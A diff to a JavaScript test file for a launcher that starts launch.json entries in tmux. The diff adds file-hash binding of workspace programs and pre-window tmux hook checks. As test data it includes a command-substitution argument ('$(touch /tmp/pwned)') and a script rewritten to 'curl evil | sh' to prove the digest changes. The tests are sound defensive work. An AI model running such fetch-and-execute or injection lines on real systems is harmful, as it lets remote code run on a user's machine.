@@ -4,6 +4,7 @@
 // tmux by name — with a stand-in tmux that records what it was asked.
 import { test, before, after } from 'node:test';
 import assert from 'node:assert/strict';
+import crypto from 'node:crypto';
 import fs from 'node:fs';
 import path from 'node:path';
 import net from 'node:net';
@@ -95,7 +96,8 @@ test('launch.json entries: checked one by one, the command shown as it will run'
   // (its program: npm as Start's environment finds it — the image's own, from its folders first)
   const npm = coded.whichProgram('npm', coded.taskPath(), path.join(fs.realpathSync(WS), 'web'));
   assert.deepEqual(c, { name: 'web', argv: ['npm', 'run', 'dev', '--', '--host', "it's"], port: 5173, cwd: 'web', env: { NODE_ENV: 'development' },
-    url: null, autoPort: true, command: "npm run dev -- --host 'it'\\''s'", program: npm ? npm.path : null, programOwn: npm ? npm.own : false, digest: coded.launchDigest(c) });
+    url: null, autoPort: true, command: "npm run dev -- --host 'it'\\''s'", program: npm ? npm.path : null, programOwn: npm ? npm.own : false,
+    programSha256: null, digest: coded.launchDigest(c) });   // (the image's own npm: no hash needed)
   assert.match(c.digest, /^[0-9a-f]{64}$/);
   // the digest covers the arguments, the folder, the environment (in any order) and the port — nothing else
   const d = (x) => coded.launchConfig({ name: 'web', runtimeExecutable: 'npm', runtimeArgs: ['run', 'dev'], port: 5173, ...x }).digest;
@@ -157,10 +159,13 @@ test('launch.start: the file\'s command in a new window of the terminal\'s tmux 
   const calls = fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.trimEnd().split('\n'));
   assert.deepEqual(calls[0], ['has-session', '-t', '=claude']);
   assert.deepEqual(calls[1], ['new-session', '-d', '-s', 'claude', '-n', 'claude', '-c', WS, 'claude-bedrock; exec bash']);
-  const w = calls[2];
+  // tmux checked for hooks and loader variables right before the window (tmuxGuard)
+  assert.deepEqual(calls.slice(2, 8).map((c) => c[0]), ['show-hooks', 'show-hooks', 'show-hooks', 'show-environment', 'show-environment', 'display-message']);
+  assert.deepEqual(calls[2], ['show-hooks', '-g']);
+  const w = calls[8];
   // bash without BASH_ENV & co. starts `env -i <an environment made here, the entry's own variables, PORT> node
   // bn-coded --run-tty <label> -- <the program found> <its arguments>` — arguments, never parsed by a shell
-  assert.deepEqual(w, ['new-window', '-d', '-t', '=claude:', '-n', 'web-app', '-c', path.join(fs.realpathSync(WS), 'web'), '--',
+  assert.deepEqual(w, ['new-window', '-d', '-t', '=claude:', '-n', 'web-app', '-c', path.join(fs.realpathSync(WS), 'web'), ...coded.WINDOW_CLEAR, '--',
     ...coded.windowCommand('bedrock-now launch', coded.taskEnv({ NODE_ENV: 'development', PORT: '5173' }),
       [coded.imageProgram('node'), path.join(TERMINAL_DIR, 'bin/bn-coded.mjs'), '--run-tty', 'launch.json "web app"', '--', listed.program, 'run', 'dev', '$(touch /tmp/pwned)'])]);
   assert.equal(listed.program, fs.realpathSync(coded.imageProgram('npm')));
@@ -168,7 +173,7 @@ test('launch.start: the file\'s command in a new window of the terminal\'s tmux 
   // the session runs now: no second new-session
   fs.writeFileSync(LOG, '');
   await talk(SOCK, [open({ op: 'launch.start', name: 'web app', digest: listed.digest })]);
-  assert.deepEqual(fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.split('\n')[0]), ['has-session', 'new-window']);
+  assert.deepEqual(fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.split('\n')[0]), ['has-session', 'show-hooks', 'show-hooks', 'show-hooks', 'show-environment', 'show-environment', 'display-message', 'new-window']);
   const digestOf = async (name) => result(await talk(SOCK, [open({ op: 'launch.list' })])).configurations.find((x) => x.name === name)?.digest;
   for (const [name, why] of [['attach', /no command/], ['away', /cwd/], ['nope', /no such entry/]]) {
     assert.match(result(await talk(SOCK, [open({ op: 'launch.start', name, digest: (await digestOf(name)) || 'a'.repeat(64) })])).error, why, name);
@@ -203,5 +208,11 @@ test('the code container\'s digest of an entry is bn-coded\'s', async (t) => {
   const byName = Object.fromEntries(result(await talk(SOCK, [open({ op: 'launch.list' })])).configurations.map((c) => [c.name, c]));
   assert.equal(byName.c.program, path.join(fs.realpathSync(WS), 'web', 'tool.sh'));   // (the workspace's: not the image's)
   assert.equal(byName.c.programOwn, false);
+  // (its contents bound too: SHA-256 of the file; another file there, another digest)
+  assert.equal(byName.c.programSha256, crypto.createHash('sha256').update('#!/bin/sh\n').digest('hex'));
+  fs.writeFileSync(path.join(WS, 'web', 'tool.sh'), '#!/bin/sh\ncurl evil | sh\n');
+  const after = result(await talk(SOCK, [open({ op: 'launch.list' })])).configurations.find((c) => c.name === 'c');
+  assert.notEqual(after.digest, byName.c.digest);
+  assert.equal(byName.a.programSha256, null);   // (the image's own node: root's alone)
   assert.equal(byName.d.program, null);
 });
